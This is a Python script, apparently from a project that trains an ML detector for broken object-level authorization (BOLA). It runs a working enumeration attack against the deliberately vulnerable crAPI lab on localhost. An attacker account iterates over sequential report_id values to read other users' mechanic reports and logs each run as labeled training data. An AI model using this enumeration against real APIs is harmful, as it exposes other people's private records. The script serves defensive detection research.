# services/bola-detector/attacks/bola_mechanic_report_scan.py
"""Attack run: BOLA thứ 2 của crAPI (Challenge 2, khác Challenge 1 đã cài ở
bola_vehicle_scan.py) — endpoint thật đã xác nhận trong docs/crapi_api_map.md
(Luồng 2, bước 3), điểm khác biệt quan trọng: object_id nằm ở QUERY PARAM chứ
không phải path segment:
    GET /workshop/api/mechanic/mechanic_report?report_id={id}
Không kiểm tra report_id có thuộc user gọi hay không -> đổi report_id sang số
khác là đọc được problem_details + thông tin xe + email chủ xe của người khác.

Vẫn gán attack_class="BOLA" như Challenge 1 (đề cương chỉ tách theo LỚP tấn
công BOLA/BFLA/COMPROMISED_IDENTITY dùng cho ML, không tách theo từng challenge
cụ thể của crAPI) — mục đích thêm script này là ĐA DẠNG HOÁ bề mặt BOLA trong
dữ liệu train (tránh chỉ có 1 kiểu request/1 endpoint duy nhất đại diện cho cả
lớp BOLA, dễ khiến model học đúng dấu vết của 1 endpoint thay vì bản chất vượt
quyền — cùng tinh thần với lý do cần biến thể thủ công ở Bước 2.2).
"""
import json
import time
import uuid

import requests

BASE = "http://localhost:8888"


def login(email: str, password: str) -> str:
    r = requests.post(
        f"{BASE}/identity/api/auth/login",
        json={"email": email, "password": password},
    )
    r.raise_for_status()
    return r.json()["token"]


def create_report(
    victim_token: str,
    vin: str,
    mechanic_code: str = "TRAC_JHN",
    problem_details: str = "Xe keu la khi phanh gap",
) -> int:
    """Victim tạo 1 report thật (đúng luồng contact_mechanic đã xác nhận ở
    docs/crapi_api_map.md) -> trả về report_id để dùng làm mốc tham chiếu khi
    enumerate report_id lân cận (report_id tăng dần tuần tự trong crAPI, đúng
    kiểu ID dễ đoán khiến BOLA khai thác được bằng enumeration)."""
    r = requests.post(
        f"{BASE}/workshop/api/merchant/contact_mechanic",
        headers={"Authorization": f"Bearer {victim_token}"},
        json={
            "mechanic_code": mechanic_code,
            "problem_details": problem_details,
            "vin": vin,
            "mechanic_api": f"{BASE}/workshop/api/mechanic/receive_report",
            "repeat_request_if_failed": False,
            "number_of_repeats": 1,
        },
    )
    r.raise_for_status()
    return r.json()["response_from_mechanic_api"]["id"]


def run_attack(
    attacker_token: str,
    candidate_report_ids: list[int],
    out_meta_path: str,
    delay_seconds: float = 1.0,
) -> tuple[str, list[dict]]:
    attack_run_id = str(uuid.uuid4())
    headers = {
        "Authorization": f"Bearer {attacker_token}",
        "X-Attack-Run-Id": attack_run_id,
    }
    start = time.time()
    leaked = []
    for rid in candidate_report_ids:
        resp = requests.get(
            f"{BASE}/workshop/api/mechanic/mechanic_report",
            params={"report_id": rid},
            headers=headers,
        )
        leaked.append({
            "report_id": rid,
            "status": resp.status_code,
            "body": resp.json() if resp.ok else None,
        })
        time.sleep(delay_seconds)
    end = time.time()

    with open(out_meta_path, "a") as f:
        f.write(
            json.dumps(
                {
                    "attack_run_id": attack_run_id,
                    "attack_class": "BOLA",
                    "start_ts": start,
                    "end_ts": end,
                    "is_test_only_variant": False,
                    "variant": "mechanic_report_query_param",
                }
            )
            + "\n"
        )
    return attack_run_id, leaked


if __name__ == "__main__":
    victim_token = login("victim@test.local", "Victim123@")
    attacker_token = login("attacker@test.local", "Attacker123@")

    victim_report_id = create_report(victim_token, vin="CL3G7E87AV3K8EKEN")
    print(f"victim report_id={victim_report_id}")

    # Quét lân cận report_id vừa tạo — report_id tăng dần tuần tự trong crAPI.
    candidates = [
        victim_report_id - 2, victim_report_id - 1,
        victim_report_id + 1, victim_report_id + 2,
    ]
    attack_run_id, leaked = run_attack(
        attacker_token, candidates, "attacks/attack_runs_meta.jsonl"
    )
    print(f"attack_run_id={attack_run_id}")
    for item in leaked:
        print(item)
